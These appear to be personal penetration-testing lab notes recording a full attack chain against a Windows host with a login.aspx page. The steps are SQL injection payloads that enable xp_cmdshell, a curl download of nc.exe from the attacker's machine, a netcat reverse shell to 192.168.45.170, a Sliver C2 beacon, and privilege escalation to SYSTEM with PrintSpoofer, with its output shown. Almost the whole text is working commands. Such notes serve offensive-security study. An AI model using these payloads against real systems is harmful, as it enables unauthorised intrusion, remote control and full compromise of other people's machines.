Attempting SQL injection on .121 at login.aspx to get a shell 
```
' EXECUTE sp_configure 'show advanced options', 1; --//
```
```
' RECONFIGURE; --//
```
```
' EXECUTE sp_configure 'xp_cmdshell', 1; --//
```
```
' RECONFIGURE; --//
```
OR
```
admin' EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXECUTE xp_cmdshell 'ping 192.168.45.170'; --//
```
Testing for ping traffic with 
```
' EXECUTE xp_cmdshell 'ping 192.168.45.170'; --//
```
- Receiving ping traffic with 
```
sudo tcpdump icmp
```
Didn't work but instead I tried to get a payload from the computer with the following and it worked 
```
' EXECUTE xp_cmdshell 'curl -o C:\Temp\nc.exe http://192.168.45.170:8080/windows/nc.exe'
```
Then I got a shell with 
```
' EXECUTE xp_cmdshell 'C:\Temp\nc.exe -e cmd.exe 192.168.45.170 5555'
```
Started sliver server and generated a  payload with 
```
http
```
```
https
```
```
generate beacon --http 192.168.45.170 --os windows -f exe 
```
moved this to my /var/www/html/windows directory and curled it on the machine and executed 
got to the beacons with 
```
beacons
```
```
use <ID>
```
to get out use 
```
background
```

whoami /priv output 
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
- This means we can execute printspoofer64.exe

- Output of printspoofer
```
.\print.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system

```